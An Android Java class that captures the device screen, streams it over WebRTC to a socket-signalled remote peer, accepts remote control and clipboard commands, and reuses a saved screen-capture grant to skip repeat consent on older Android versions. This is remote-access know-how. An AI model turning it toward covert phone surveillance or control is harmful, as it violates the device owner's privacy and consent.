package com.fason.app.features.screen;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.content.ClipData;
import android.content.ClipboardManager;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;

import org.json.JSONArray;
import org.json.JSONObject;
import org.webrtc.DataChannel;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.MediaStream;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.ScreenCapturerAndroid;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import io.socket.client.Socket;

public final class ScreenCaptureService {

    private static final String TAG = "ScreenCaptureService";

    private static volatile ScreenCaptureService instance;
    private static volatile boolean destroyed = false;

    private MediaProjectionManager mpm;
    private Intent projectionData;
    private int projectionResultCode;

    private EglBase eglBase;
    private PeerConnectionFactory peerConnectionFactory;
    private PeerConnection peerConnection;
    private VideoCapturer videoCapturer;
    private SurfaceTextureHelper surfaceTextureHelper;
    private VideoSource videoSource;
    private VideoTrack videoTrack;

    private List<JSONObject> pendingIceCandidates = new ArrayList<>();

    private volatile boolean streaming = false;
    private int screenWidth = 1280;
    private int screenHeight = 720;
    private int targetFps = 30;

    private static int savedResultCode = 0;
    private static Intent savedResultData = null;

    private ScreenCaptureService() {}

    public static synchronized ScreenCaptureService getInstance() {
        if (destroyed) return null;
        if (instance == null) {
            instance = new ScreenCaptureService();
        }
        return instance;
    }

    public static void saveProjectionResult(int resultCode, Intent data) {
        savedResultCode = resultCode;
        savedResultData = data != null ? (Intent) data.clone() : null;
    }

    public static boolean hasSavedProjection() {
        return savedResultCode == Activity.RESULT_OK && savedResultData != null;
    }

    public boolean tryReuse() {
        if (Build.VERSION.SDK_INT >= 34 || !hasSavedProjection()) {
            return false;
        }
        startCapture(savedResultCode, savedResultData);
        return true;
    }

    private void detectScreenSize() {
        try {
            WindowManager wm = (WindowManager) FasonApp.getContext().getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                DisplayMetrics metrics = new DisplayMetrics();
                wm.getDefaultDisplay().getRealMetrics(metrics);
                screenWidth = metrics.widthPixels;
                screenHeight = metrics.heightPixels;
            }
        } catch (Exception ignored) {}
    }

    public void startCapture(int resultCode, Intent data) {
        if (streaming) return;
        this.projectionResultCode = resultCode;
        this.projectionData = data;

        detectScreenSize();

        Context ctx = FasonApp.getContext();
        mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        }

        if (Build.VERSION.SDK_INT < 34) {
            saveProjectionResult(resultCode, data);
        }

        streaming = true;
        sendStatus(true);
    }

    public void handleWebRtcOffer(JSONObject data) {
        if (!streaming || projectionData == null) return;
        try {
            String sdp = data.getString("sdp");
            JSONArray iceServersArr = data.optJSONArray("iceServers");

            List<PeerConnection.IceServer> iceServers = new ArrayList<>();
            if (iceServersArr != null) {
                for (int i = 0; i < iceServersArr.length(); i++) {
                    JSONObject srv = iceServersArr.getJSONObject(i);
                    PeerConnection.IceServer.Builder builder = PeerConnection.IceServer.builder(srv.getString("urls"));
                    if (srv.has("username")) builder.setUsername(srv.getString("username"));
                    if (srv.has("credential")) builder.setPassword(srv.getString("credential"));
                    iceServers.add(builder.createIceServer());
                }
            }

            if (!initWebRtc(iceServers)) return;

            peerConnection.setRemoteDescription(new SimpleSdpObserver(), new SessionDescription(SessionDescription.Type.OFFER, sdp));
            peerConnection.createAnswer(new SimpleSdpObserver() {
                @Override
                public void onCreateSuccess(SessionDescription sessionDescription) {
                    peerConnection.setLocalDescription(new SimpleSdpObserver(), sessionDescription);
                    try {
                        JSONObject answer = new JSONObject();
                        answer.put("sdp", sessionDescription.description);
                        Socket socket = SocketClient.getInstance().getSocket();
                        if (socket != null) socket.emit(Protocol.WEBRTC_ANSWER, answer);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to send WebRTC answer", e);
                    }
                }

                @Override
                public void onCreateFailure(String s) {
                    Log.e(TAG, "createAnswer failed: " + s);
                    sendError("WebRTC answer creation failed: " + s);
                }

                @Override
                public void onSetFailure(String s) {
                    Log.e(TAG, "setLocalDescription failed: " + s);
                    sendError("WebRTC local description failed: " + s);
                }
            }, new MediaConstraints());

        } catch (Exception e) {
            Log.e(TAG, "WebRTC Offer error", e);
            sendError("WebRTC Offer error: " + e.getMessage());
        }
    }

    public void handleWebRtcIce(JSONObject data) {
        if (peerConnection == null) {
            pendingIceCandidates.add(data);
            return;
        }
        try {
            String candidate = data.getString("candidate");
            String sdpMid = data.getString("sdpMid");
            int sdpMLineIndex = data.getInt("sdpMLineIndex");
            peerConnection.addIceCandidate(new IceCandidate(sdpMid, sdpMLineIndex, candidate));
        } catch (Exception e) {
            Log.e(TAG, "Failed to add ICE candidate", e);
        }
    }

    private boolean initWebRtc(List<PeerConnection.IceServer> iceServers) {
        if (peerConnection != null) return true;
        if (peerConnectionFactory != null) return false;

        Context ctx = FasonApp.getContext();
        try {
            PeerConnectionFactory.InitializationOptions initOptions = PeerConnectionFactory.InitializationOptions.builder(ctx)
                    .setEnableInternalTracer(true)
                    .createInitializationOptions();
            PeerConnectionFactory.initialize(initOptions);
        } catch (Exception e) {
            Log.e(TAG, "PeerConnectionFactory.initialize failed", e);
            sendError("WebRTC init failed: " + e.getMessage());
            return false;
        }

        try {
            eglBase = EglBase.create();
        } catch (Exception e) {
            Log.e(TAG, "EglBase.create failed", e);
            sendError("EGL init failed: " + e.getMessage());
            return false;
        }

        try {
            DefaultVideoEncoderFactory encoderFactory = new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true);
            DefaultVideoDecoderFactory decoderFactory = new DefaultVideoDecoderFactory(eglBase.getEglBaseContext());

            peerConnectionFactory = PeerConnectionFactory.builder()
                    .setVideoEncoderFactory(encoderFactory)
                    .setVideoDecoderFactory(decoderFactory)
                    .createPeerConnectionFactory();
        } catch (Exception e) {
            Log.e(TAG, "PeerConnectionFactory creation failed", e);
            cleanPartialInit();
            sendError("WebRTC factory failed: " + e.getMessage());
            return false;
        }

        try {
            PeerConnection.RTCConfiguration rtcConfig = new PeerConnection.RTCConfiguration(iceServers);
            rtcConfig.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
            rtcConfig.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
            rtcConfig.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;

            peerConnection = peerConnectionFactory.createPeerConnection(rtcConfig, new PeerConnection.Observer() {
                @Override
                public void onSignalingChange(PeerConnection.SignalingState signalingState) {}
                @Override
                public void onIceConnectionChange(PeerConnection.IceConnectionState iceConnectionState) {
                    if (iceConnectionState == PeerConnection.IceConnectionState.FAILED) {
                        Log.w(TAG, "ICE connection FAILED — stopping capture");
                        stopCapture();
                    } else if (iceConnectionState == PeerConnection.IceConnectionState.DISCONNECTED) {
                        Log.w(TAG, "ICE connection DISCONNECTED — waiting for recovery...");
                        // Don't stop immediately — ICE may recover or frontend will trigger restart
                    }
                }
                @Override
                public void onIceConnectionReceivingChange(boolean b) {}
                @Override
                public void onIceGatheringChange(PeerConnection.IceGatheringState iceGatheringState) {}
                @Override
                public void onIceCandidate(IceCandidate iceCandidate) {
                    try {
                        JSONObject ice = new JSONObject();
                        ice.put("candidate", iceCandidate.sdp);
                        ice.put("sdpMid", iceCandidate.sdpMid);
                        ice.put("sdpMLineIndex", iceCandidate.sdpMLineIndex);
                        Socket socket = SocketClient.getInstance().getSocket();
                        if (socket != null) socket.emit(Protocol.WEBRTC_ICE, ice);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to send ICE candidate", e);
                    }
                }
                @Override
                public void onIceCandidatesRemoved(IceCandidate[] iceCandidates) {}
                @Override
                public void onAddStream(MediaStream mediaStream) {}
                @Override
                public void onRemoveStream(MediaStream mediaStream) {}
                @Override
                public void onDataChannel(DataChannel dataChannel) {
                    dataChannel.registerObserver(new DataChannel.Observer() {
                        @Override
                        public void onBufferedAmountChange(long l) {}
                        @Override
                        public void onStateChange() {}
                        @Override
                        public void onMessage(DataChannel.Buffer buffer) {
                            try {
                                byte[] data = new byte[buffer.data.remaining()];
                                buffer.data.get(data);
                                String message = new String(data, StandardCharsets.UTF_8);

                                if (dataChannel.label().equals("control")) {
                                    JSONObject cmd = new JSONObject(message);
                                    ScreenControlService.handleCommand(cmd);
                                } else if (dataChannel.label().equals("clipboard")) {
                                    JSONObject cmd = new JSONObject(message);
                                    String text = cmd.optString("text", "");
                                    if (!text.isEmpty()) {
                                        new Handler(Looper.getMainLooper()).post(() -> {
                                            try {
                                                ClipboardManager cm = (ClipboardManager) FasonApp.getContext()
                                                        .getSystemService(Context.CLIPBOARD_SERVICE);
                                                if (cm != null) {
                                                    cm.setPrimaryClip(ClipData.newPlainText("remote", text));
                                                }
                                            } catch (Exception ignored) {}
                                        });
                                    }
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "DataChannel message error", e);
                            }
                        }
                    });
                }
                @Override
                public void onRenegotiationNeeded() {}
                @Override
                public void onAddTrack(org.webrtc.RtpReceiver rtpReceiver, MediaStream[] mediaStreams) {}
            });

        } catch (Exception e) {
            Log.e(TAG, "PeerConnection creation failed", e);
            cleanPartialInit();
            sendError("PeerConnection failed: " + e.getMessage());
            return false;
        }

        try {
            videoCapturer = new ScreenCapturerAndroid(projectionData, new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    sendError("Screen capture permission revoked");
                    new Handler(Looper.getMainLooper()).post(() -> stopCapture());
                }
            });

            surfaceTextureHelper = SurfaceTextureHelper.create("ScreenCaptureThread", eglBase.getEglBaseContext());
            videoSource = peerConnectionFactory.createVideoSource(true);
            videoCapturer.initialize(surfaceTextureHelper, ctx, videoSource.getCapturerObserver());
            videoCapturer.startCapture(screenWidth, screenHeight, targetFps);

            videoTrack = peerConnectionFactory.createVideoTrack("100", videoSource);
            peerConnection.addTrack(videoTrack);

        } catch (Exception e) {
            Log.e(TAG, "Video capture setup failed", e);
            cleanPartialInit();
            sendError("Video capture failed: " + e.getMessage());
            return false;
        }

        for (JSONObject ice : pendingIceCandidates) {
            handleWebRtcIce(ice);
        }
        pendingIceCandidates.clear();

        return true;
    }

    private void cleanPartialInit() {
        if (videoTrack != null) { videoTrack.dispose(); videoTrack = null; }
        if (videoSource != null) { videoSource.dispose(); videoSource = null; }
        if (surfaceTextureHelper != null) { surfaceTextureHelper.dispose(); surfaceTextureHelper = null; }
        if (videoCapturer != null) {
            try { videoCapturer.stopCapture(); } catch (Exception ignored) {}
            videoCapturer.dispose();
            videoCapturer = null;
        }
        if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
        if (peerConnectionFactory != null) { peerConnectionFactory.dispose(); peerConnectionFactory = null; }
        if (eglBase != null) { eglBase.release(); eglBase = null; }
        pendingIceCandidates.clear();
    }

    public void stopCapture() {
        streaming = false;

        // Correct disposal order: stop capturer FIRST, then dispose dependent resources
        if (videoCapturer != null) {
            try { videoCapturer.stopCapture(); } catch (Exception e) { Log.e(TAG, "vc stop", e); }
            try { videoCapturer.dispose(); } catch (Exception e) { Log.e(TAG, "vc dispose", e); }
            videoCapturer = null;
        }
        if (surfaceTextureHelper != null) {
            try { surfaceTextureHelper.dispose(); } catch (Exception e) { Log.e(TAG, "sth dispose", e); }
            surfaceTextureHelper = null;
        }
        if (videoTrack != null) {
            try { videoTrack.dispose(); } catch (Exception e) { Log.e(TAG, "vt dispose", e); }
            videoTrack = null;
        }
        if (videoSource != null) {
            try { videoSource.dispose(); } catch (Exception e) { Log.e(TAG, "vs dispose", e); }
            videoSource = null;
        }
        if (peerConnection != null) {
            try { peerConnection.close(); } catch (Exception e) { Log.e(TAG, "pc close", e); }
            peerConnection = null;
        }
        if (peerConnectionFactory != null) {
            try { peerConnectionFactory.dispose(); } catch (Exception e) { Log.e(TAG, "pcf dispose", e); }
            peerConnectionFactory = null;
        }
        if (eglBase != null) {
            try { eglBase.release(); } catch (Exception e) { Log.e(TAG, "egl release", e); }
            eglBase = null;
        }
        pendingIceCandidates.clear();

        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        }

        sendStatus(false);
    }

    public void setFps(int fps) {
        if (fps > 0 && fps <= 60) {
            this.targetFps = fps;
        }
    }

    public void setQuality(int quality) {
        // Quality adjustment could be implemented via encoder parameters if needed
    }

    public void setScale(float scale) {
        if (scale > 0 && scale <= 1.0f) {
            screenWidth = (int) (screenWidth * scale);
            screenHeight = (int) (screenHeight * scale);
        }
    }

    public boolean isStreaming() {
        return streaming;
    }

    public int getScreenWidth() { return screenWidth; }
    public int getScreenHeight() { return screenHeight; }

    private void sendStatus(boolean streaming) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null) {
                JSONObject status = new JSONObject();
                status.put(Protocol.KEY_TYPE, Protocol.KEY_STATUS);
                status.put(Protocol.KEY_STREAMING, streaming);
                status.put(Protocol.KEY_ACCESSIBLE, ScreenControlService.isEnabled());
                socket.emit(Protocol.SCREEN, status);
            }
        } catch (Exception e) {
            Log.e(TAG, "sendStatus failed", e);
        }
    }

    private void sendError(String error) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null) {
                JSONObject err = new JSONObject();
                err.put(Protocol.KEY_TYPE, Protocol.KEY_ERROR);
                err.put(Protocol.KEY_ERROR, error);
                socket.emit(Protocol.SCREEN, err);
            }
        } catch (Exception e) {
            Log.e(TAG, "sendError failed", e);
        }
    }

    public void shutdown() {
        stopCapture();
        destroyed = true;
        instance = null;
    }

    private static class SimpleSdpObserver implements org.webrtc.SdpObserver {
        @Override public void onCreateSuccess(SessionDescription sessionDescription) {}
        @Override public void onSetSuccess() {}
        @Override public void onCreateFailure(String s) { Log.e(TAG, "SDP create failure: " + s); }
        @Override public void onSetFailure(String s) { Log.e(TAG, "SDP set failure: " + s); }
    }
}
